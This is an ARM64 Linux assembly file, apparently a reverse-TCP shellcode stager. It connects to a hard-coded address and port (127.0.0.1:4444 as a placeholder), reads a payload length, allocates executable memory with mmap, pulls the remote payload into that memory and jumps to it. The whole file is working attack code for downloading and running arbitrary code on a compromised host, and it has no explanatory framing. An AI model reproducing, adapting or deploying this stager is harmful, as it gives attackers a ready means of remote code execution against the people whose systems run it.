.equ SYS_SOCKET, 0xc6
.equ SYS_CONNECT, 0xcb
.equ SYS_READ, 0x3f
.equ SYS_MMAP, 0xde
.equ SYS_EXIT, 0x5d

.equ AF_INET, 0x2
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

.equ IP, 0x0100007f
.equ PORT, 0x5C11

start:
    /* sockfd = socket(AF_INET, SOCK_STREAM, 0) */
    mov    x0, AF_INET
    mov    x1, SOCK_STREAM
    mov    x2, 0
    mov    x8, SYS_SOCKET
    svc    0
    mov    x12, x0

    /* connect(sockfd, (struct sockaddr *)&server, sockaddr_len) */
    adr    x1, sockaddr
    mov    x2, 0x10
    mov    x8, SYS_CONNECT
    svc    0
    cbnz   w0, failed

    /* read(sockfd, buf='x1', nbytes=4) */
    mov    x0, x12
    sub    sp, sp, #16
    mov    x1, sp
    mov    x2, #4
    mov    x8, SYS_READ
    svc    0
    cmn    x0, #0x1
    beq    failed

    ldr    w2, [sp,#0]

    /* Page-align, assume <4GB */
    lsr    x2, x2, #12
    add    x2, x2, #1
    lsl    x2, x2, #12

    /* mmap(addr=0, length='x2', prot=7, flags=34, fd=0, offset=0) */
    mov    x0, xzr
    mov    x1, x2
    mov    x2, #7
    mov    x3, #34
    mov    x4, xzr
    mov    x5, xzr
    mov    x8, SYS_MMAP
    svc    0
    cmn    x0, #0x1
    beq    failed

    /* Grab the saved size, save the address */
    ldr    w4, [sp]

    /* Save the memory address */
    str    x0, [sp]

    /* Read in all of the data */
    mov    x3, x0

read_loop:
    /* read(sockfd, buf='x3', nbytes='x4') */
    mov    x0, x12
    mov    x1, x3
    mov    x2, x4
    mov    x8, SYS_READ
    svc    0
    cmn    x0, #0x1
    beq    failed
    add    x3, x3, x0
    subs   x4, x4, x0
    bne    read_loop

    /* Go to shellcode */
    ldr    x0, [sp]
    blr    x0

failed:
    mov    x0, 0
    mov    x8, SYS_EXIT
    svc    0

.balign 4
sockaddr:
.short AF_INET
.short PORT
.word  IP

